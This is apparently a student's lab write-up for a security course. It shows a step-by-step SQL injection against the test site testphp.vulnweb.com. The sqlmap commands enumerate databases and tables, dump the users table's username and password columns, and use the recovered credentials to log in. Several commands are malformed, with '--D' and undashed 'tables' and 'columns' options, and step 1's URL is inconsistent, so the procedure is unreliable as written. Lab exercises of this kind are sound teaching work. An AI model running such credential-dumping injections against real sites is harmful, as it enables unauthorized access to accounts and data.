# COMP421-InfoSec Assignment 1
# Name: Hamza Asaad Roll No: 231450993

## Pre-quisite Steps Taken
- Installation of ```sqlmap``` on Mac Terminal using the command ```brew install sqlmap```.
- Changed MacOS terminal from ```zsh``` to ```bash``` due to issues with ```sqlmap``` on zsh.

## Steps Performed for SQL Injection Attack
1. Open website ```vulnweb.com``` and proceed to Acuart sub domain ```http://vulnweb.com```.
2. To proceed we must find a link which makes a query paramter request to the SQL database on the backend as such we can browse to the 'artist' tab and click on one of the three links leading us to the page with the link ```http://testphp.vulnweb.com/artists.php?artist=1``` which does indeed contain a query param.
3. We can confirm our request to a SQL DB by appending a quotation at the end and seeing the result ```http://testphp.vulnweb.com/artists.php?artist=1'``` .
4. Now that we have our link and confirmed it uses a SQL based DB we can perform the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs``` to find its databases.
5. Now we can further find tables within these found databases using the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart tables```.
6. We will find 8 tables and focus our attention to the ```users``` table and further use the command ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users columns``` and see the columns within the ```user``` table.
7. Now we will observe 8 columns and target the ```uname``` and ```pass``` column and dump their respective data with the following commands:
   - ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users -C uname --dump``` 
   - ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users -C pass --dump```
8. We will find both commands result with us finding ```test``` as both the username and password for the admin panel of the website.

With this we have successfully carried out our SQL Injection Attack resulting in us finding the ```username``` and  ```password``` for the admin panel of the website. Observing the sidebar on the website we can click the ```Sign Up``` button use the username and password we have discovered to Log In.

## List Of Commands Executed
1. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs```
2. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart tables```
3. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users columns``` 
4. ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users -C uname --dump```
5.  ```sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --D acuart -T users -C pass --dump```



